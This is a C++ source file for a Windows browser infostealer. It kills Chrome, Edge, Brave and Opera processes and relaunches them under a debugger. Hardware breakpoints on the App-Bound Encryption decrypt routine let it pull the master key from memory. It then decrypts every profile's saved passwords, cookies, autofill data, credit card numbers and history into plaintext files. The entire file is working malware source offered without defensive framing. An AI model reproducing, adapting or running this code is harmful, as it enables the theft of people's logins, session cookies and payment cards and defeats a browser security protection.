#include <windows.h>
#include <tlhelp32.h>
#include <bcrypt.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <iostream>
#include <vector>
#include <string>
#include <filesystem>
#include <fstream>
#include <algorithm>
#include <memory>
#include <cstring>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

namespace fs = std::filesystem;

struct BrowserConfig {
    std::string name;
    std::string process_name;
    std::vector<std::wstring> exe_paths;
    std::string dll_name;
    std::vector<std::wstring> user_data_subdir;
    std::string output_dir;
    std::string temp_prefix;
    bool use_r14;
    bool use_roaming;
    bool has_abe;
};

// Function prototypes
void kill_processes_by_name(const std::string& target_name);
std::wstring get_user_data_dir(const std::vector<std::wstring>& subdir, bool use_roaming);
std::vector<uint8_t> base64_decode(const std::string& input);
bool get_v10_key(const std::wstring& user_data_dir, std::vector<uint8_t>& key, bool& is_dpapi);
void extract_all_profiles_data(const std::vector<uint8_t>& v20_key, const BrowserConfig& config, const std::wstring& user_data_dir);
void debug_loop(HANDLE h_process, const BrowserConfig& config, const std::wstring& user_data_dir);
size_t find_target_address(HANDLE h_process, void* base_addr, const std::string& browser_name);
std::vector<uint32_t> get_all_threads(uint32_t process_id);
void set_hardware_breakpoint(uint32_t thread_id, size_t address);
void clear_hardware_breakpoints(uint32_t process_id);
void set_resume_flag(uint32_t thread_id);
bool extract_key(uint32_t thread_id, HANDLE h_process, const BrowserConfig& config, const std::wstring& user_data_dir);

int main() {
    std::vector<BrowserConfig> configs = {
        {
            "Google Chrome",
            "chrome.exe",
            {L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"},
            "chrome.dll",
            {L"Google", L"Chrome", L"User Data"},
            "chrome_extract",
            "chrome_tmp",
            false, false, true
        },
        {
            "Microsoft Edge",
            "msedge.exe",
            {L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"},
            "msedge.dll",
            {L"Microsoft", L"Edge", L"User Data"},
            "edge_extract",
            "edge_tmp",
            true, false, true
        },
        {
            "Brave",
            "brave.exe",
            {L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", L"C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"},
            "chrome.dll",
            {L"BraveSoftware", L"Brave-Browser", L"User Data"},
            "brave_extract",
            "brave_tmp",
            false, false, true
        },
        {
            "Opera Stable",
            "opera.exe",
            {L"C:\\Program Files\\Opera\\launcher.exe", L"C:\\Program Files (x86)\\Opera\\launcher.exe"},
            "launcher_lib.dll",
            {L"Opera Software", L"Opera Stable"},
            "opera_extract",
            "opera_tmp",
            false, true, false
        },
        {
            "Opera GX",
            "opera.exe",
            {L"C:\\Program Files\\Opera GX\\launcher.exe", L"C:\\Program Files (x86)\\Opera GX\\launcher.exe"},
            "launcher_lib.dll",
            {L"Opera Software", L"Opera GX Stable"},
            "operagx_extract",
            "operagx_tmp",
            false, true, false
        }
    };

    kill_processes_by_name("chrome.exe");
    kill_processes_by_name("msedge.exe");
    kill_processes_by_name("brave.exe");
    kill_processes_by_name("opera.exe");
    kill_processes_by_name("launcher.exe");

    for (const auto& config : configs) {
        std::wstring user_data_dir = get_user_data_dir(config.user_data_subdir, config.use_roaming);
        if (user_data_dir.empty()) {
            std::cout << "User data directory not found for " << config.name << ", skipping..." << std::endl;
            continue;
        }

        std::wstring exe_path = L"";
        for (const auto& path : config.exe_paths) {
            if (fs::exists(path)) {
                exe_path = path;
                break;
            }
        }

        if (exe_path.empty()) {
            // Check for Opera user path
            if (config.name.find("Opera") != std::string::npos) {
                wchar_t* localAppData;
                if (SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &localAppData) == S_OK) {
                    std::wstring operaUserPath = localAppData;
                    CoTaskMemFree(localAppData);
                    if (config.name.find("GX") != std::string::npos) {
                        operaUserPath += L"\\Programs\\Opera GX\\opera.exe";
                    } else {
                        operaUserPath += L"\\Programs\\Opera\\opera.exe";
                    }
                    if (fs::exists(operaUserPath)) {
                        exe_path = operaUserPath;
                    }
                }
            }
        }

        if (exe_path.empty()) {
            std::cout << "Executable not found for " << config.name << ", skipping..." << std::endl;
            continue;
        }

        std::cout << "Processing " << config.name << "..." << std::endl;

        std::vector<uint8_t> v10_key;
        bool is_dpapi = false;
        bool has_key = get_v10_key(user_data_dir, v10_key, is_dpapi);

        bool should_debug = config.has_abe;

        if (has_key) {
            if (is_dpapi && !config.has_abe) {
                std::cout << "Found DPAPI key for " << config.name << ", extracting immediately..." << std::endl;
                extract_all_profiles_data({}, config, user_data_dir);
                should_debug = false;
            } else if (!is_dpapi && !config.has_abe) {
                std::cout << "Found ABE key for " << config.name << ", extracting immediately..." << std::endl;
                extract_all_profiles_data(v10_key, config, user_data_dir);
                should_debug = false;
            }
        }

        if (!should_debug && !config.has_abe) continue;

        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        std::wstring cmd_line = L"\"" + exe_path + L"\" --no-first-run --no-default-browser-check";

        std::vector<wchar_t> cmd_buffer(cmd_line.begin(), cmd_line.end());
        cmd_buffer.push_back(0);

        if (CreateProcessW(NULL, cmd_buffer.data(), NULL, NULL, FALSE,
            DEBUG_ONLY_THIS_PROCESS | CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {

            std::cout << "Started " << config.name << " with PID: " << pi.dwProcessId << std::endl;
            debug_loop(pi.hProcess, config, user_data_dir);

            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        } else {
            std::cerr << "Failed to create " << config.name << " process. Error: " << GetLastError() << std::endl;
        }
    }

    return 0;
}

void kill_processes_by_name(const std::string& target_name) {
    std::wstring target_name_w(target_name.begin(), target_name.end());
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(snapshot, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, target_name_w.c_str()) == 0) {
                    HANDLE h_process = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                    if (h_process) {
                        TerminateProcess(h_process, 0);
                        CloseHandle(h_process);
                    }
                }
            } while (Process32NextW(snapshot, &pe));
        }
        CloseHandle(snapshot);
    }
}

std::vector<uint32_t> get_all_threads(uint32_t process_id) {
    std::vector<uint32_t> threads;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        THREADENTRY32 te;
        te.dwSize = sizeof(THREADENTRY32);
        if (Thread32First(snapshot, &te)) {
            do {
                if (te.th32OwnerProcessID == process_id) {
                    threads.push_back(te.th32ThreadID);
                }
            } while (Thread32Next(snapshot, &te));
        }
        CloseHandle(snapshot);
    }
    return threads;
}

void set_hardware_breakpoint(uint32_t thread_id, size_t address) {
    HANDLE h_thread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, thread_id);
    if (h_thread) {
        SuspendThread(h_thread);
        CONTEXT ctx = { 0 };
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        if (GetThreadContext(h_thread, &ctx)) {
            ctx.Dr0 = address;
            ctx.Dr7 = (ctx.Dr7 & ~0b11) | 0b01; // Enable DR0 local
            SetThreadContext(h_thread, &ctx);
        }
        ResumeThread(h_thread);
        CloseHandle(h_thread);
    }
}

void clear_hardware_breakpoints(uint32_t process_id) {
    std::vector<uint32_t> threads = get_all_threads(process_id);
    for (uint32_t thread_id : threads) {
        HANDLE h_thread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, thread_id);
        if (h_thread) {
            SuspendThread(h_thread);
            CONTEXT ctx = { 0 };
            ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
            if (GetThreadContext(h_thread, &ctx)) {
                ctx.Dr0 = 0;
                ctx.Dr7 &= ~0b11; // Disable DR0
                SetThreadContext(h_thread, &ctx);
            }
            ResumeThread(h_thread);
            CloseHandle(h_thread);
        }
    }
}

void set_resume_flag(uint32_t thread_id) {
    HANDLE h_thread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, thread_id);
    if (h_thread) {
        SuspendThread(h_thread);
        CONTEXT ctx = { 0 };
        ctx.ContextFlags = CONTEXT_CONTROL;
        if (GetThreadContext(h_thread, &ctx)) {
            ctx.EFlags |= 0x10000; // Set RF (Resume Flag)
            SetThreadContext(h_thread, &ctx);
        }
        ResumeThread(h_thread);
        CloseHandle(h_thread);
    }
}

std::vector<uint8_t> base64_decode(const std::string& input) {
    DWORD out_len = 0;
    if (CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, NULL, &out_len, NULL, NULL)) {
        std::vector<uint8_t> out(out_len);
        if (CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, out.data(), &out_len, NULL, NULL)) {
            return out;
        }
    }
    return {};
}

std::wstring get_user_data_dir(const std::vector<std::wstring>& subdir, bool use_roaming) {
    wchar_t* path = NULL;
    if (SHGetKnownFolderPath(use_roaming ? FOLDERID_RoamingAppData : FOLDERID_LocalAppData, 0, NULL, &path) == S_OK) {
        fs::path p(path);
        CoTaskMemFree(path);
        for (const auto& component : subdir) {
            p /= component;
        }
        if (fs::exists(p)) return p.wstring();
    }
    return L"";
}

bool get_v10_key(const std::wstring& user_data_dir, std::vector<uint8_t>& key, bool& is_dpapi) {
    fs::path local_state_path = fs::path(user_data_dir) / L"Local State";
    std::ifstream ifs(local_state_path);
    if (!ifs.is_open()) return false;

    std::string content((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
    size_t pos = content.find("\"encrypted_key\":\"");
    if (pos == std::string::npos) return false;
    pos += 17;
    size_t end = content.find("\"", pos);
    if (end == std::string::npos) return false;

    std::string encrypted_key_b64 = content.substr(pos, end - pos);
    std::vector<uint8_t> encrypted_key = base64_decode(encrypted_key_b64);
    if (encrypted_key.empty()) return false;

    is_dpapi = (encrypted_key.size() >= 5 && memcmp(encrypted_key.data(), "DPAPI", 5) == 0);
    const uint8_t* blob_data = is_dpapi ? encrypted_key.data() + 5 : encrypted_key.data();
    size_t blob_size = is_dpapi ? encrypted_key.size() - 5 : encrypted_key.size();

    DATA_BLOB input = { (DWORD)blob_size, (BYTE*)blob_data };
    DATA_BLOB output = { 0, NULL };

    if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
        if (output.cbData == 32) {
            key.assign(output.pbData, output.pbData + output.cbData);
            LocalFree(output.pbData);
            return true;
        }
        LocalFree(output.pbData);
    }
    return false;
}

std::vector<uint8_t> decrypt_aes_gcm(const std::vector<uint8_t>& key, const std::vector<uint8_t>& nonce, const std::vector<uint8_t>& ciphertext) {
    BCRYPT_ALG_HANDLE h_alg = NULL;
    BCRYPT_KEY_HANDLE h_key = NULL;
    std::vector<uint8_t> plaintext;

    if (BCryptOpenAlgorithmProvider(&h_alg, BCRYPT_AES_ALGORITHM, NULL, 0) == 0) {
        if (BCryptSetProperty(h_alg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) == 0) {
            if (BCryptGenerateSymmetricKey(h_alg, &h_key, NULL, 0, (BYTE*)key.data(), (ULONG)key.size(), 0) == 0) {
                BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth_info;
                BCRYPT_INIT_AUTH_MODE_INFO(auth_info);

                // Last 16 bytes are the tag
                if (ciphertext.size() > 16) {
                    std::vector<uint8_t> actual_ciphertext(ciphertext.begin(), ciphertext.end() - 16);
                    std::vector<uint8_t> tag(ciphertext.end() - 16, ciphertext.end());

                    auth_info.pbNonce = (BYTE*)nonce.data();
                    auth_info.cbNonce = (ULONG)nonce.size();
                    auth_info.pbTag = tag.data();
                    auth_info.cbTag = (ULONG)tag.size();

                    DWORD out_len = 0;
                    if (BCryptDecrypt(h_key, (BYTE*)actual_ciphertext.data(), (ULONG)actual_ciphertext.size(), &auth_info, NULL, 0, NULL, 0, &out_len, 0) == 0) {
                        plaintext.resize(out_len);
                        if (BCryptDecrypt(h_key, (BYTE*)actual_ciphertext.data(), (ULONG)actual_ciphertext.size(), &auth_info, NULL, 0, plaintext.data(), (ULONG)plaintext.size(), &out_len, 0) != 0) {
                            plaintext.clear();
                        }
                    }
                }
            }
        }
    }

    if (h_key) BCryptDestroyKey(h_key);
    if (h_alg) BCryptCloseAlgorithmProvider(h_alg, 0);
    return plaintext;
}

std::vector<uint8_t> decrypt_blob(const std::vector<uint8_t>& blob, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, bool is_opera) {
    if (blob.empty()) return {};

    if (blob.size() > 15 && memcmp(blob.data(), "v10", 3) == 0) {
        std::vector<uint8_t> nonce(blob.begin() + 3, blob.begin() + 15);
        std::vector<uint8_t> ciphertext(blob.begin() + 15, blob.end());

        std::vector<uint8_t> dec;
        if (!v10_key.empty()) dec = decrypt_aes_gcm(v10_key, nonce, ciphertext);
        if (dec.empty() && !v20_key.empty()) dec = decrypt_aes_gcm(v20_key, nonce, ciphertext);

        if (!dec.empty()) {
            if (is_opera && dec.size() > 32) return std::vector<uint8_t>(dec.begin() + 32, dec.end());
            return dec;
        }
    } else if (blob.size() > 15 && memcmp(blob.data(), "v20", 3) == 0) {
        std::vector<uint8_t> nonce(blob.begin() + 3, blob.begin() + 15);
        std::vector<uint8_t> ciphertext(blob.begin() + 15, blob.end());

        std::vector<uint8_t> dec;
        if (!v20_key.empty()) dec = decrypt_aes_gcm(v20_key, nonce, ciphertext);
        if (dec.empty() && !v10_key.empty()) dec = decrypt_aes_gcm(v10_key, nonce, ciphertext);

        if (!dec.empty() && dec.size() > 32) return std::vector<uint8_t>(dec.begin() + 32, dec.end());
        return dec;
    } else if (blob.size() > 15) {
        DATA_BLOB input = { (DWORD)blob.size(), (BYTE*)blob.data() };
        DATA_BLOB output = { 0, NULL };
        if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
            std::vector<uint8_t> dec(output.pbData, output.pbData + output.cbData);
            LocalFree(output.pbData);
            return dec;
        }
    }

    return {};
}

std::vector<uint8_t> read_process_memory_chunk(HANDLE h_process, void* addr, size_t size) {
    std::vector<uint8_t> buffer(size);
    SIZE_T bytes_read = 0;
    if (ReadProcessMemory(h_process, addr, buffer.data(), size, &bytes_read)) {
        buffer.resize(bytes_read);
    } else {
        buffer.clear();
    }
    return buffer;
}

size_t find_subsequence(const std::vector<uint8_t>& haystack, const std::vector<uint8_t>& needle) {
    auto it = std::search(haystack.begin(), haystack.end(), needle.begin(), needle.end());
    if (it != haystack.end()) {
        return std::distance(haystack.begin(), it);
    }
    return std::string::npos;
}

size_t find_target_address(HANDLE h_process, void* base_addr, const std::string& browser_name) {
    IMAGE_DOS_HEADER dos_header;
    SIZE_T bytes_read = 0;
    if (!ReadProcessMemory(h_process, base_addr, &dos_header, sizeof(dos_header), &bytes_read)) return 0;

    IMAGE_NT_HEADERS64 nt_headers;
    if (!ReadProcessMemory(h_process, (BYTE*)base_addr + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers), &bytes_read)) return 0;

    WORD section_count = nt_headers.FileHeader.NumberOfSections;
    std::vector<IMAGE_SECTION_HEADER> sections(section_count);
    if (!ReadProcessMemory(h_process, (BYTE*)base_addr + dos_header.e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + nt_headers.FileHeader.SizeOfOptionalHeader, sections.data(), sizeof(IMAGE_SECTION_HEADER) * section_count, &bytes_read)) return 0;

    std::string target_string = "OSCrypt.AppBoundProvider.Decrypt.ResultCode";
    std::vector<uint8_t> needle(target_string.begin(), target_string.end());
    size_t string_va = 0;

    for (const auto& section : sections) {
        if (strncmp((char*)section.Name, ".rdata", 6) == 0) {
            std::vector<uint8_t> section_data = read_process_memory_chunk(h_process, (BYTE*)base_addr + section.VirtualAddress, section.Misc.VirtualSize);
            size_t pos = find_subsequence(section_data, needle);
            if (pos != std::string::npos) {
                string_va = (size_t)base_addr + section.VirtualAddress + pos;
                break;
            }
        }
    }

    if (string_va == 0) {
        std::cout << "Could not find target string in " << browser_name << "'s .rdata section" << std::endl;
        return 0;
    }

    for (const auto& section : sections) {
        if (strncmp((char*)section.Name, ".text", 5) == 0) {
            size_t section_start = (size_t)base_addr + section.VirtualAddress;
            std::vector<uint8_t> section_data = read_process_memory_chunk(h_process, (BYTE*)base_addr + section.VirtualAddress, section.Misc.VirtualSize);

            for (size_t pos = 0; pos + 7 <= section_data.size(); ++pos) {
                if (section_data[pos] == 0x48 && section_data[pos+1] == 0x8D && section_data[pos+2] == 0x0D) {
                    int32_t offset = *(int32_t*)&section_data[pos+3];
                    size_t rip = section_start + pos + 7;
                    size_t target = (size_t)((int64_t)rip + offset);

                    if (target == string_va) {
                        std::cout << "Found matching LEA instruction at 0x" << std::hex << section_start + pos << " for " << browser_name << std::dec << std::endl;
                        return section_start + pos;
                    }
                }
            }
        }
    }

    std::cout << "Could not find matching LEA instruction in " << browser_name << "'s .text section" << std::endl;
    return 0;
}

void debug_loop(HANDLE h_process, const BrowserConfig& config, const std::wstring& user_data_dir) {
    DEBUG_EVENT debug_event = { 0 };
    size_t target_address = 0;

    while (WaitForDebugEvent(&debug_event, INFINITE)) {
        switch (debug_event.dwDebugEventCode) {
            case LOAD_DLL_DEBUG_EVENT: {
                wchar_t buffer[MAX_PATH];
                if (GetFinalPathNameByHandleW(debug_event.u.LoadDll.hFile, buffer, MAX_PATH, 0)) {
                    std::wstring path = buffer;
                    std::wstring dll_name_w(config.dll_name.begin(), config.dll_name.end());
                    if (path.find(dll_name_w) != std::wstring::npos) {
                        std::cout << "Found " << config.dll_name << " at " << std::hex << debug_event.u.LoadDll.lpBaseOfDll << std::dec << std::endl;
                        target_address = find_target_address(h_process, debug_event.u.LoadDll.lpBaseOfDll, config.name);
                        if (target_address != 0) {
                            std::vector<uint32_t> threads = get_all_threads(debug_event.dwProcessId);
                            std::cout << "Setting hardware breakpoints for " << config.name << " on " << threads.size() << " threads" << std::endl;
                            for (uint32_t thread_id : threads) {
                                set_hardware_breakpoint(thread_id, target_address);
                            }
                        }
                    }
                }
                break;
            }
            case CREATE_THREAD_DEBUG_EVENT: {
                if (target_address != 0) {
                    set_hardware_breakpoint(debug_event.dwThreadId, target_address);
                }
                break;
            }
            case EXCEPTION_DEBUG_EVENT: {
                if (debug_event.u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP) {
                    if ((size_t)debug_event.u.Exception.ExceptionRecord.ExceptionAddress == target_address) {
                        std::cout << "Target breakpoint hit!" << std::endl;
                        if (extract_key(debug_event.dwThreadId, h_process, config, user_data_dir)) {
                            clear_hardware_breakpoints(debug_event.dwProcessId);
                            TerminateProcess(h_process, 0);
                        }
                    }
                    set_resume_flag(debug_event.dwThreadId);
                }
                break;
            }
            case EXIT_PROCESS_DEBUG_EVENT:
                goto end_loop;
        }
        ContinueDebugEvent(debug_event.dwProcessId, debug_event.dwThreadId, DBG_CONTINUE);
    }
end_loop:;
}

bool extract_key(uint32_t thread_id, HANDLE h_process, const BrowserConfig& config, const std::wstring& user_data_dir) {
    HANDLE h_thread = OpenThread(THREAD_GET_CONTEXT, FALSE, thread_id);
    if (!h_thread) return false;

    bool success = false;
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;
    if (GetThreadContext(h_thread, &ctx)) {
        std::vector<DWORD64> key_ptrs = config.use_r14 ? std::vector<DWORD64>{ctx.R14, ctx.R15} : std::vector<DWORD64>{ctx.R15, ctx.R14};

        for (DWORD64 ptr : key_ptrs) {
            if (ptr == 0) continue;
            std::vector<uint8_t> buffer(32);
            SIZE_T bytes_read = 0;
            if (ReadProcessMemory(h_process, (LPCVOID)ptr, buffer.data(), 32, &bytes_read)) {
                DWORD64 data_ptr = ptr;
                uint64_t length = *(uint64_t*)&buffer[8];
                if (length == 32) {
                    data_ptr = *(DWORD64*)&buffer[0];
                }

                std::vector<uint8_t> key(32);
                if (ReadProcessMemory(h_process, (LPCVOID)data_ptr, key.data(), 32, &bytes_read)) {
                    bool all_zero = true;
                    for (uint8_t b : key) if (b != 0) { all_zero = false; break; }
                    if (!all_zero) {
                        std::cout << "Extracted Master Key from 0x" << std::hex << data_ptr << std::dec << std::endl;
                        extract_all_profiles_data(key, config, user_data_dir);
                        success = true;
                        break;
                    }
                }
            }
        }
    }

    CloseHandle(h_thread);
    return success;
}

#include "includes/sqlite3.h"

void extract_passwords(const fs::path& profile_path, const fs::path& output_dir, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, const std::string& temp_prefix, bool is_opera) {
    fs::path db_path = profile_path / "Login Data";
    if (!fs::exists(db_path)) return;

    fs::path temp_db = fs::temp_directory_path() / (temp_prefix + "_" + std::to_string(GetTickCount64()));
    fs::copy(db_path, temp_db);

    sqlite3* db;
    if (sqlite3_open(temp_db.string().c_str(), &db) == 0) {
        sqlite3_stmt* stmt;
        const char* sql = "SELECT origin_url, username_value, password_value FROM logins";
        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == 0) {
            std::ofstream ofs(output_dir / "passwords.txt");
            while (sqlite3_step(stmt) == 100) { // SQLITE_ROW
                const char* url = (const char*)sqlite3_column_text(stmt, 0);
                const char* user = (const char*)sqlite3_column_text(stmt, 1);
                const uint8_t* blob_ptr = (const uint8_t*)sqlite3_column_blob(stmt, 2);
                int blob_size = sqlite3_column_bytes(stmt, 2);

                std::vector<uint8_t> blob(blob_ptr, blob_ptr + blob_size);
                std::vector<uint8_t> dec = decrypt_blob(blob, v10_key, v20_key, is_opera);
                if (!dec.empty()) {
                    ofs << "URL: " << (url ? url : "") << "\nUser: " << (user ? user : "") << "\nPass: " << std::string(dec.begin(), dec.end()) << "\n---\n";
                }
            }
            sqlite3_finalize(stmt);
        }
        sqlite3_close(db);
    }
    fs::remove(temp_db);
}

void extract_cookies(const fs::path& profile_path, const fs::path& output_dir, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, const std::string& temp_prefix, bool is_opera) {
    fs::path db_path = profile_path / "Network" / "Cookies";
    if (!fs::exists(db_path)) db_path = profile_path / "Cookies";
    if (!fs::exists(db_path)) return;

    fs::path temp_db = fs::temp_directory_path() / (temp_prefix + "_" + std::to_string(GetTickCount64()));
    fs::copy(db_path, temp_db);

    sqlite3* db;
    if (sqlite3_open(temp_db.string().c_str(), &db) == 0) {
        sqlite3_stmt* stmt;
        const char* sql = "SELECT host_key, name, value, encrypted_value FROM cookies";
        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == 0) {
            std::ofstream ofs(output_dir / "cookies.txt");
            while (sqlite3_step(stmt) == 100) {
                const char* host = (const char*)sqlite3_column_text(stmt, 0);
                const char* name = (const char*)sqlite3_column_text(stmt, 1);
                const char* value = (const char*)sqlite3_column_text(stmt, 2);
                const uint8_t* blob_ptr = (const uint8_t*)sqlite3_column_blob(stmt, 3);
                int blob_size = sqlite3_column_bytes(stmt, 3);

                std::vector<uint8_t> blob(blob_ptr, blob_ptr + blob_size);
                std::vector<uint8_t> dec = decrypt_blob(blob, v10_key, v20_key, is_opera);

                std::string cookie_val = !dec.empty() ? std::string(dec.begin(), dec.end()) : (value ? value : "");
                if (!cookie_val.empty()) {
                    ofs << "Host: " << (host ? host : "") << " | Name: " << (name ? name : "") << " | Value: " << cookie_val << "\n";
                }
            }
            sqlite3_finalize(stmt);
        }
        sqlite3_close(db);
    }
    fs::remove(temp_db);
}

void extract_autofill(const fs::path& profile_path, const fs::path& output_dir, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, const std::string& temp_prefix, bool is_opera) {
    fs::path db_path = profile_path / "Web Data";
    if (!fs::exists(db_path)) return;

    fs::path temp_db = fs::temp_directory_path() / (temp_prefix + "_" + std::to_string(GetTickCount64()));
    fs::copy(db_path, temp_db);

    sqlite3* db;
    if (sqlite3_open(temp_db.string().c_str(), &db) == 0) {
        std::ofstream ofs(output_dir / "autofill.txt");
        sqlite3_stmt* stmt;

        if (sqlite3_prepare_v2(db, "SELECT name, value FROM autofill", -1, &stmt, NULL) == 0) {
            while (sqlite3_step(stmt) == 100) {
                ofs << "Form: " << (const char*)sqlite3_column_text(stmt, 0) << " = " << (const char*)sqlite3_column_text(stmt, 1) << "\n";
            }
            sqlite3_finalize(stmt);
        }

        const char* tables[] = {"autofill_profile_names", "autofill_profile_emails", "autofill_profile_phones"};
        for (const char* table : tables) {
            std::string col = strstr(table, "name") ? "first_name" : (strstr(table, "email") ? "email" : "number");
            std::string sql = "SELECT guid, " + col + " FROM " + table;
            if (sqlite3_prepare_v2(db, sql.c_str(), -1, &stmt, NULL) == 0) {
                while (sqlite3_step(stmt) == 100) {
                    ofs << table << " (" << (const char*)sqlite3_column_text(stmt, 0) << "): " << (const char*)sqlite3_column_text(stmt, 1) << "\n";
                }
                sqlite3_finalize(stmt);
            }
        }

        if (sqlite3_prepare_v2(db, "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", -1, &stmt, NULL) == 0) {
            while (sqlite3_step(stmt) == 100) {
                const char* name = (const char*)sqlite3_column_text(stmt, 0);
                int m = sqlite3_column_int(stmt, 1);
                int y = sqlite3_column_int(stmt, 2);
                const uint8_t* blob_ptr = (const uint8_t*)sqlite3_column_blob(stmt, 3);
                int blob_size = sqlite3_column_bytes(stmt, 3);

                std::vector<uint8_t> dec = decrypt_blob(std::vector<uint8_t>(blob_ptr, blob_ptr + blob_size), v10_key, v20_key, is_opera);
                if (!dec.empty()) {
                    ofs << "Card: " << (name ? name : "") << " | Exp: " << m << "/" << y << " | Num: " << std::string(dec.begin(), dec.end()) << "\n";
                }
            }
            sqlite3_finalize(stmt);
        }
        sqlite3_close(db);
    }
    fs::remove(temp_db);
}

void extract_history(const fs::path& profile_path, const fs::path& output_dir, const std::string& temp_prefix) {
    fs::path db_path = profile_path / "History";
    if (!fs::exists(db_path)) return;

    fs::path temp_db = fs::temp_directory_path() / (temp_prefix + "_" + std::to_string(GetTickCount64()));
    fs::copy(db_path, temp_db);

    sqlite3* db;
    if (sqlite3_open(temp_db.string().c_str(), &db) == 0) {
        sqlite3_stmt* stmt;
        const char* sql = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100";
        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == 0) {
            std::ofstream ofs(output_dir / "history.txt");
            while (sqlite3_step(stmt) == 100) {
                const char* url = (const char*)sqlite3_column_text(stmt, 0);
                const char* title = (const char*)sqlite3_column_text(stmt, 1);
                int count = sqlite3_column_int(stmt, 2);
                ofs << "URL: " << (url ? url : "") << " | Title: " << (title ? title : "") << " | Visits: " << count << "\n";
            }
            sqlite3_finalize(stmt);
        }
        sqlite3_close(db);
    }
    fs::remove(temp_db);
}

void extract_all_profiles_data(const std::vector<uint8_t>& v20_key, const BrowserConfig& config, const std::wstring& user_data_dir) {
    std::vector<uint8_t> v10_key;
    bool is_dpapi = false;
    get_v10_key(user_data_dir, v10_key, is_dpapi);

    fs::path user_data(user_data_dir);
    fs::path output_root(config.output_dir);
    fs::create_directories(output_root);

    bool is_opera = config.name.find("Opera") != std::string::npos;

    for (const auto& entry : fs::directory_iterator(user_data)) {
        if (entry.is_directory()) {
            if (fs::exists(entry.path() / "Preferences")) {
                std::string profile_name = entry.path().filename().string();
                std::cout << "Extracting data for profile: " << profile_name << std::endl;
                fs::path profile_output = output_root / profile_name;
                fs::create_directories(profile_output);

                extract_passwords(entry.path(), profile_output, v10_key, v20_key, config.temp_prefix, is_opera);
                extract_cookies(entry.path(), profile_output, v10_key, v20_key, config.temp_prefix, is_opera);
                extract_autofill(entry.path(), profile_output, v10_key, v20_key, config.temp_prefix, is_opera);
                extract_history(entry.path(), profile_output, config.temp_prefix);
            }
        }
    }
    std::cout << "Extraction complete for " << config.name << ". Data saved in " << config.output_dir << " folder." << std::endl;
}
